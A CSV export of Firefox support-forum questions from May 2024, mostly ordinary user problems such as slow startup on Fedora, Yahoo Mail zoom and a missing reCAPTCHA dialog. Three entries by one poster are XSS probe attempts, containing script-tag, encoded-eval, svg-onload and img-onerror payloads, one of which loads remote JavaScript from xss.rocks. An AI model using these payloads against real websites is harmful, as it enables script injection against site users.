id,created,updated,title,content,tags,product,topic,locale,answers,creator
1446477,2024-05-03 06:53:09 -0700,2024-05-03 08:00:08 -0700,Firefox takes ~5 minutes to startup (even the Profile Manager and in every possible modes),"<p>Firefox <strong>takes about 5 minutes to load every it launches</strong>, before working smoothly like it should. This problem occured first time yesterday morning, and I have no idea what could have caused it. </p><p><strong>It happens&nbsp;:</strong> </p> <ul><li> when I launch firefox normally (whatever the profile) </li><li> when I launch it from the terminal (it provides no output at all) </li><li> when I tell it to launch the Profile Manager (5 minutes to see the Profile Manager appear, then 5 more minutes to launch firefox using the selected profile) </li></ul> <p>It does not happen&nbsp;: </p> <ul><li> when I click ""New Window"" inside an existing firefox process </li><li> when I call `firefox --help` from the terminal </li></ul> <p>Here's what I've tried&nbsp;: </p> <ul><li> First, I've seen pretty much every article from Mozilla Support, Reddit or SuperUser (writing this question is kind of my last resort) </li><li> I've tried removing and then reinstalling Firefox from Flatpak, from the Fedora repos (using `sudo dnf install firefox`) and using the manual install via the archive (v125) </li><li> I've tried downgrading firefox (when using the package manager install) from v125 to v124 </li><li> I've also tried the Firefox Developer Edition, same problem here </li><li> I've tried using the ""Refresh Firefox"" feature and restarting in Troubleshoot Mode (both are also affected by the slow startup, which makes them particularly painful to execute) </li><li> I've tried manually deleting the `~/.mozilla/` folder (= manually deleting my profiles) </li></ul> <p>When firefox launches, it does not freezes my OS and does not seem to use many system ressources&nbsp;: CPU usage is normal, RAM as well, and it does not seem to read many things from the disk as well <em>(I've seen some threads where this was the issue).</em> </p><p>And here is something interesting that I discovered&nbsp;: </p> <ul><li> <strong>loading (including refreshing) `about:profiles` is also slow and this time freezes firefox</strong> (OS reports it as not responding, I can't switch tabs and I can't see my mouse). Other about pages seem to work fine (although I did not try them all) </li></ul> <p>Thanks&nbsp;! </p><p>PS&nbsp;: Even if I think it has nothing to do with the issue, I prefer to mention it here&nbsp;: I was messing with virtual machines yesterday when the issue occured for the first time. My disk got full at some point and I don't know but it might have messed with firefox. At this stage, I had not deleted any files that could relate somehow to Firefox, that's why I doubt it would have caused anything harmful to Firefox. (instead, I mounted an empty partition from my disk to get some space) </p>",desktop;fix-problems;firefox-1250;firefox-12502;,firefox,fix-problems,en-US,1651038;1651046;,martin.heywang1
1446475,2024-05-03 06:27:09 -0700,2024-05-03 08:15:56 -0700,Yahoo Mail always opens at 170% zoom,"<p>Yahoo Mail always opens at 170% zoom.  It opens normally in Microsoft Edge.  All other windows open normally at 100% zoom.  I can manually change it back to 100% but, that is annoying to have to do every time. How do I fix this?   </p><p>Windows 11 Firefix 125.0.3 </p><p>Thanks, Dan </p>",desktop;other;windows-11;firefox-1250;firefox-12503;,firefox,other,en-US,1651024;1651029;1651036;1651040;1651043;1651048;,djsmith11235
1446474,2024-05-03 05:44:43 -0700,2024-05-03 05:44:43 -0700,reCAPTCHA dialog does not appear,"<p>I encountered a website today for which the reCAPTCHA dialog wouldn't appear. This is not a case of the endless blue circling of the reCAPTCHA screen. In this case, the reCAPTCHA screen does not appear at all. </p><p>I thought it was a problem with my account at the website since nothing happened when I clicked LOGIN. It wasn't until I tried Edge and the reCAPTCHA dialog appeared that I realized the problem was not with the website, but with Firefox not presenting the reCAPTCHA dialog. </p><p>I do not know whether the problem is with the site specifically since I have not encountered any other sites recently that required reCAPTCHA authentication. </p><p>Thanks... bms </p><p>Currently running Firefox v125.0.3 (Standard Browser Security) on Windows 11 Pro (v10.0.22621 Build 22621) </p>",desktop;windows-11;website-breakages;firefox-1250;firefox-12503;,firefox,website-breakages,en-US,"",bsadler1
1446473,2024-05-03 05:42:20 -0700,2024-05-03 05:42:20 -0700,administración de contraseñas,<p>Administración de contraseñas </p>,desktop;customize;,firefox,customize,es,"",ynglesperezantonio1
1446472,2024-05-03 05:41:37 -0700,2024-05-03 05:43:05 -0700,dfdasf,"""&gt;<h1 id=""w_dddd"">dddd</h1> <p>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(""XSS"");&lt;/SCRIPT&gt; &lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt; &lt;/title&gt;&lt;script x&gt; alert(1)  <img src=""1"" alt=""al""> &lt;/title&gt;&lt;script&gt;$=1,alert($)&lt;/script&gt; &lt;/title&gt;&lt;script ~~~&gt;confirm(1)&lt;/script ~~~&gt; &lt;/title&gt;&lt;script&gt;$=1,\u0061lert($)&lt;/script&gt; &lt;/title&gt;&lt;&lt;/script/script&gt;&lt;script&gt;eval('\\u'+'0061'+'lert(1)')//&lt;/script&gt; &lt;/title&gt;&lt;&lt;/script/script&gt;&lt;script ~~~&gt;\u0061lert(1)&lt;/script ~~~&gt; &lt;/title&gt;&lt;scRipt&gt;alert(1)&lt;/scRipt&gt; <img alt=""String.fromCharCode(88,83,83)""> &lt;svg&gt;&lt;x&gt;&lt;script&gt;alert('1'&amp;#41&lt;/x&gt; &lt;iframe src="""" srcdoc=""&lt;svg onload=alert(1)&gt;"" &gt;="""" &lt;svg&gt;&lt;animate="""" onbegin=""alert()"" attributename=""x&gt;&lt;/svg&gt;""&gt; &lt;img src=1 onerror=""s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"" &lt;/p&gt;&lt;/iframe&gt;</p>",desktop;customize;windows-11;,firefox,customize,en-US,1651008;1651009;1651010;1651011;,7odasec
1446471,2024-05-03 05:40:31 -0700,2024-05-03 05:44:14 -0700,"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>","<p>&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(""XSS"");&lt;/SCRIPT&gt; &lt;/title&gt;&lt;script&gt;alert(1);&lt;/script&gt; &lt;/title&gt;&lt;script x&gt; alert(1)  <img src=""1"" alt=""al""> &lt;/title&gt;&lt;script&gt;$=1,alert($)&lt;/script&gt; &lt;/title&gt;&lt;script ~~~&gt;confirm(1)&lt;/script ~~~&gt; &lt;/title&gt;&lt;script&gt;$=1,\u0061lert($)&lt;/script&gt; &lt;/title&gt;&lt;&lt;/script/script&gt;&lt;script&gt;eval('\\u'+'0061'+'lert(1)')//&lt;/script&gt; &lt;/title&gt;&lt;&lt;/script/script&gt;&lt;script ~~~&gt;\u0061lert(1)&lt;/script ~~~&gt; &lt;/title&gt;&lt;scRipt&gt;alert(1)&lt;/scRipt&gt; <img alt=""String.fromCharCode(88,83,83)""> &lt;svg&gt;&lt;x&gt;&lt;script&gt;alert('1'&amp;#41&lt;/x&gt; &lt;iframe src="""" srcdoc=""&lt;svg onload=alert(1)&gt;"" &gt;="""" &lt;svg&gt;&lt;animate="""" onbegin=""alert()"" attributename=""x&gt;&lt;/svg&gt;""&gt; &lt;img src=1 onerror=""s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"" &lt;/p&gt;&lt;/iframe&gt;</p>",desktop;customize;windows-11;,firefox,customize,en-US,1651012;1651013;1651014;,7odasec
1446470,2024-05-03 05:38:58 -0700,2024-05-03 05:39:39 -0700,adfadsaf,"<p>""/&gt;<img> ""/&gt;<img> ""/&gt;<img> ""/&gt;<img> ""/&gt;<img> ""/&gt;<img> ""/&gt;<img> ""/&gt;<img> ""/&gt;<img> </p>",desktop;customize;windows-11;,firefox,customize,en-US,1651007;,7odasec
1446469,2024-05-03 05:28:53 -0700,2024-05-03 06:39:37 -0700,default startup page keeps changing,"<p>The attached photo shows the startup page that appeared today, yesterday that page had 12 of my most frequent websites loaded in place of the ones you see now. This page keeps changing on me and it's infuriating to have to remake it every few months. </p><p>What is going on?? </p><p>AB </p>",desktop;customize;mac-os-x-1015;firefox-1250;firefox-12503;,firefox,customize,en-US,1651017;1651020;1651025;,ghosthard
1446466,2024-05-03 05:10:56 -0700,2024-05-03 06:11:51 -0700,A website's verification code box was one digit too small.,"<p>A website's verification code box was one digit too small. Had to use another browser to complete the verification. The website is <a href=""http://www.ssa.gov"" rel=""nofollow"">http://www.ssa.gov</a> </p><p>I never had this problem before.Specifically, the last digit in the verification code code not enter the box. </p>",desktop;other;windows-11;firefox-1250;firefox-12503;,firefox,other,en-US,1651018;,flyingwombat
1446465,2024-05-03 05:09:34 -0700,2024-05-03 07:31:46 -0700,Firefox takes ages to launch on my fedora 40,"<p>After upgrading to fedora 40, firefox just takes ages to boot up, even when it's running if I want to open a new window it still takes ages to run. I have tried uninstalling it and deleting it's data but with no luck. The issue still presists. </p>",linux;desktop;fix-problems;firefox-1250;firefox-12502;,firefox,fix-problems,en-US,1651019;1651026;1651034;,alinada
